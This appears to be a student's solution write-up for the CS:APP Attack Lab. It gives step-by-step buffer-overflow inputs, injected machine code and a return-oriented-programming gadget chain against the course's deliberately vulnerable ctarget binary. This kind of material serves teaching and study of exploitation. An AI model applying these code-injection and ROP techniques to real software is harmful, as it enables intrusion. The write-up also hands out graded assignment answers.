# Detailed solution

`p*l*.txt` contains the input, i.e., `./hex2raw < p*l*.txt | ./ctarget -q` can pass corresponding phase.

## Part I: Code Injection Attacks

### Level 1

The normal return address of `getbuf` should be `0x401976`, and the starting address for `touch1` is `0x4017c0`.

Try input `abcdefg`, and examine contents in the stack.

```
0x7ffffffa50d0:	0x61	0x62	0x63	0x64	0x65	0x66	0x67	0x00
0x7ffffffa50d8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7ffffffa50e0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7ffffffa50e8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7ffffffa50f0:	0xf8	0xdb	0xff	0xff	0xff	0x7f	0x00	0x00
0x7ffffffa50f8:	0x76	0x19	0x40	0x00	0x00	0x00	0x00	0x00
```

We can know it can accept at most 40 characters (bytes), so just input 40 padding bytes followed by `c0 17 40`.

### Level 2

I had thought that I just need to jump to the right exit, but there is a validation function... Well, it can't be that easy!

But this level is still not that hard. The hints just tell us what to do -- set the register (`%rdi`) to your cookie, and then use a ret instruction to transfer control to the first instruction in touch2. Well, to jump to a return address, just push it into the stack and return. Then we get the code we want to inject! 

Assemble and disassemble it, we get:

```assembly
0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq   
```

We can put the codes at the beginning of the input string, and replace the address in level 1 with the starting address for the input `0x5561dc78`. And now this level is passed.

### Level 3

Encode cookie `59b997fa` into a string, we get `35 39 62 39 39 37 66 61 00 `

I put it just before the return address. The code is similar to level 2, but to avoid the string is overwritten, `sub $0x28,%rsp` is added.

```assembly
0000000000000000 <.text>:
   0:	48 83 ec 28          	sub    $0x28,%rsp
   4:	48 c7 c7 97 dc 61 55 	mov    $0x5561dc97,%rdi # addr of cookie string
   b:	68 fa 18 40 00       	pushq  $0x4018fa # starting addr of touch3
  10:	c3                   	retq   

```

## Part II: Return-Oriented Programming

### Level 2

First just take a look at the codes where our gadgets lie in. The hints just tell us to find `48 89`, `5*`.

```assembly
000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  40199f:	c3                   	retq   

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   
# movq %rax %rdi
# ret

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   
# popq %rax
# nop
# ret

00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	retq   

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	retq   

00000000004019bc <setval_470>:
  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4019c2:	c3                   	retq   

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   
# same as 273

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   
# same as 219
```

Then what to do is crystal-clear: use `popq %rax` and `movq %rax %rdi` as a replacement for `mov $0x59b997fa,%rdi`.

So the stack is composed of: first paddings, then `4019ab`(pop),  then `59b997fa`(pop data), then `4019a2`(mov), then `4017ec`(touch2 address).

### Level 3

Skipped.

